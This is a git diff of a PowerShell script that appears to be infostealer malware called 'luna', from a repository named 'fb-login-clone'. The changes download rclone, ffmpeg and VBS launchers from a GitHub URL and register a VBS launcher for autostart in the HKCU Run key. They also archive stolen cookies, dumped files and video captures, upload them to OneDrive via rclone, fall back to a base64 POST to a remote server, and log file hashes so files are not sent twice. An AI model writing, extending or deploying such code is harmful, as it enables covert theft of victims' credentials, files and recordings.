@@ -217,24 +217,52 @@ Start-Job -ScriptBlock {
 
 function Ensure-Autostart {
     $path = "$env:APPDATA\Microsoft\Windows\luna"
+    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
+    $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat", "setup.vbs", "luna_launcher.vbs")
+
     if (!(Test-Path $path)) {
         New-Item -ItemType Directory -Path $path -Force | Out-Null
-        $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
-        $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat")
-        foreach ($f in $files) {
-            Invoke-WebRequest "$repo/$f" -OutFile "$path\$f" -UseBasicParsing
-        }
+    }
 
-        $batPath = "$path\luna_launcher.bat"
-        if (Test-Path $batPath) {
-            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value $batPath -ErrorAction Stop
-            Write-Output "Autostart registered: $batPath"
-        } else {
-            Write-Warning "Launcher not found for autostart: $batPath"
+    foreach ($f in $files) {
+        $dest = "$path\$f"
+        if (!(Test-Path $dest)) {
+            try {
+                Invoke-WebRequest "$repo/$f" -OutFile $dest -UseBasicParsing
+                Write-Output "Downloaded: $f"
+            } catch {
+                Write-Warning ("Failed to download {0}: {1}" -f $f, $_.Exception.Message)
+            }
         }
+    }
 
+    $vbsLauncher = "$path\luna_launcher.vbs"
+    if (Test-Path $vbsLauncher) {
+        try {
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                -Name "luna" -Value $vbsLauncher -ErrorAction Stop
+            Write-Output "Autostart via VBS registered: $vbsLauncher"
+        } catch {
+            Write-Warning ("Failed to set autostart: {0}" -f $_.Exception.Message)
+        }
+    } else {
+        Write-Warning "Launcher VBS not found: $vbsLauncher"
     }
 }
+
+$sentLog = "$env:TEMP\luna\sent_files.log"
+
+function Is-NewFile($path) {
+    if (!(Test-Path $sentLog)) { return $true }
+    $hash = Get-FileHash $path -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+    return -not (Select-String -Path $sentLog -Pattern $hash -Quiet)
+}
+
+function Mark-AsSent($path) {
+    $hash = Get-FileHash $path -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+    Add-Content -Path $sentLog -Value $hash
+}
+
 function Archive-And-Report {
     $global:archiveSuccess = $false
     $videoSubDir = "$tempDir\video"
@@ -276,6 +304,11 @@ function Archive-And-Report {
                 $pathsToArchive += Get-Item $staticFile
             }
         }
+        foreach ($dir in @($cookieDir, $fileDumpDir, $videoSubDir)) {
+            if (Test-Path $dir) {
+                $pathsToArchive += Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue
+            }
+        }
 
         $pathsToArchive = $pathsToArchive | Where-Object {
             $_ -and (Test-Path $_.FullName) -and !(Test-Path $_.FullName -PathType Container)
@@ -298,11 +331,24 @@ function Archive-And-Report {
         & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
         if ($LASTEXITCODE -ne 0) {
-            $bytes = [System.IO.File]::ReadAllBytes($zipPath)
-            $base64 = [System.Convert]::ToBase64String($bytes)
-            $body = @{ data = $base64; filename = [IO.Path]::GetFileName($zipPath) } | ConvertTo-Json -Compress
-            Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
+            try {
+                $stream = [System.IO.File]::OpenRead($zipPath)
+                $buffer = New-Object byte[] $stream.Length
+                $stream.Read($buffer, 0, $buffer.Length) | Out-Null
+                $stream.Close()
+
+                $base64 = [System.Convert]::ToBase64String($buffer)
+                $body = @{
+                    data = $base64
+                    filename = [IO.Path]::GetFileName($zipPath)
+                } | ConvertTo-Json -Compress -Depth 5
+
+                Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
+            } catch {
+                Write-Warning "Failed to send archive backup via POST: $_"
+            }
         }
+
 
         $filesList = if (Test-Path $fileDumpDir) { Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue } else { @() }
         $cookiesList = if (Test-Path $cookieDir) { Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue } else { @() }
